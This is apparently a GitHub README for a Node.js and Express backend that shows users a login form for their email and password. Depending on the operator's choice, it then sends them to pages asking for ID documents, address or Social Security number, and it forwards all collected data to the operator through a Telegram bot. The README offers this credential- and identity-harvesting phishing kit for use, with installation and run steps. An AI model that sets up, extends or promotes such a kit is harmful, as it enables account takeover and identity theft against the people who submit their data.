# Tele Login Bot Backend

## Short Description
This is a Node.js project that allows an admin to control the user’s journey after login. The user fills in their email and password, then is directed to a page chosen by the admin (ID, Address, or SSN). Once all the data is collected, it is sent to the admin via a Telegram bot.

## Key Features
- The user fills in their email and password to log in.
- The admin can choose the direction to ID, Address, or SSN pages for the user.
- After all data is collected, the admin receives the complete data via a Telegram bot.

## Technologies Used
- **Node.js** (version 14.x or higher)
- **Express.js** for HTTP server.
- **Multer** for handling file uploads.
- **node-telegram-bot-api** for integration with the Telegram bot.
- **Nodemon** for real-time development server.

## Installation Guide
1. Make sure **Node.js** is installed on your machine.
2. Clone this repository:
   ```bash
   (https://github.com/adistianherlambang/Tele-Login-Bot-Backend-With-Node-JS.git)
   ```
3. Navigate to the project directory:
   ```bash
   cd repository
   ```
4. Install the dependencies:
   ```bash
   npm install
   ```
5. Replace the `API_KEY` in the `main.js` file with your Telegram bot's API key, which you can get from [@BotFather](https://core.telegram.org/bots#botfather).
6. Run the application:
   ```bash
   npm run bot
   ```

## Usage Instructions
1. Once installation is complete, the bot will run and can receive messages from users.
2. The user fills in their email and password on the login page and will be redirected to either the ID, Address, or SSN page, based on the admin’s choice.
3. After all the data is collected, the admin will receive the complete user information via the Telegram bot.

## Contribution
If you wish to contribute to this project, please follow these steps:
1. Fork this repository.
2. Create a new branch (`git checkout -b feature-featureName`).
3. Make the desired changes and commit (`git commit -m 'Add feature X'`).
4. Push to your branch (`git push origin feature-featureName`).
5. Create a pull request.

## License
This project is licensed under the **ISC License**. See the `LICENSE` file for more details.

## Contact

If you have any questions or would like to contribute, feel free to contact me via:

[![Email](https://img.shields.io/badge/Email-adistian59@gmail.com-red?style=for-the-badge&logo=gmail&logoColor=white)](mailto:adistian59@gmail.com)  
[![Instagram](https://img.shields.io/badge/Instagram-%40adstian__-blue?style=for-the-badge&logo=instagram&logoColor=white)](https://www.instagram.com/adstian__)  
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Adistian%20Herlambang-blue?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/adistian-herlambang-1562a3198/)
